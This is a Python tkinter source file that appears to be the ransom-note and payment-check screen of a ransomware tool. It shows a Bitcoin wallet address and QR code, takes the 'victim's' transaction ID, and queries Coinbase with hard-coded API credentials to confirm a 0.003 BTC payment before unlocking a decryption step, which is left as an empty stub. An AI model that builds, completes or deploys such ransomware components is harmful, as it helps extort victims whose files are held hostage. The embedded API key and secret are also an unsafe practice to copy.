import tkinter as tk
from tkinter import filedialog, Text
from coinbase.wallet.client import Client
import os

root = tk.Tk()

canvas = tk.Canvas(root, height=800, width=1250, bg="#841212")
canvas.pack()

canDecrypt = False


def decryption_start():
    global canDecrypt
    if not canDecrypt:
        pass
    else:
        pass

# "b605656f-5bad-51ec-b200-c368aeac3fbe"


def check_payment():
    global canDecrypt
    transaction_id = client_transaction_id.get("1.0", tk.END+"-1c")
    api_key = 'ixhbHrVaDtbmlQQJ'
    api_secret = 'bwlPbxI86g8BSnp7TKb6eFMW47n40B92'
    account_id = "ce4c1a1f-65a4-5098-b6ac-b2f0f16f603f"
    # ["to"]["address"]
    client = Client(api_key, api_secret)
    transaction = client.get_transaction(account_id, transaction_id)
    canDecrypt = transaction["amount"]["amount"] == "0.003" and transaction["to"]["address"] == "my_address"
    # Changes should me made to canDecrypt.
    print(transaction, canDecrypt)
    # GUI CHANGES HERE...


def copy_address():
    r = tk.Tk()
    r.withdraw()
    r.clipboard_clear()
    r.clipboard_append("37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv")
    r.destroy()

# --------- TEXT ------------
# WHERE TO PUT THE VICTIM'S TRANSACTION ID:

transaction_id_writing = tk.Label(root, text="Transaction id here:", height=2)
transaction_id_writing.place(x=430, y=760)

# BITCOIN WALLET
my_wallet_id = tk.Label(root, text="BITCOIN WALLET: 37fRiWcuXADrjukfXu2eaQ5k4RP99sp4Bv", height=2)
my_wallet_id.place(x=835, y=570)

# VICTIM'S TRANSACTION ID
client_transaction_id = Text(root, height=2, width=40)
client_transaction_id.place(x=550, y=760)


# --------- BUTTONS ------------
# A BUTTON TO CHECK PAYMENT
CheckPayment = tk.Button(root, text="Check Payment", fg="black", bg="white", padx=130, pady=5, command=check_payment)
CheckPayment.place(x=900, y=760)

# A BUTTON TO COPY THE ADDRESS TO CLIPBOARD
CopyAddress = tk.Button(root, text="Copy", fg="black", bg="white", padx=25, pady=5, command=copy_address)
CopyAddress.place(x=1160, y=570)
bitcoin_accepted_here = tk.PhotoImage(file="bitcoin.png")
canvas.create_image(1040, 680, image=bitcoin_accepted_here)
qr_code = tk.PhotoImage(file="QR.PNG")
canvas.create_image(740, 670, image=qr_code)
root.mainloop()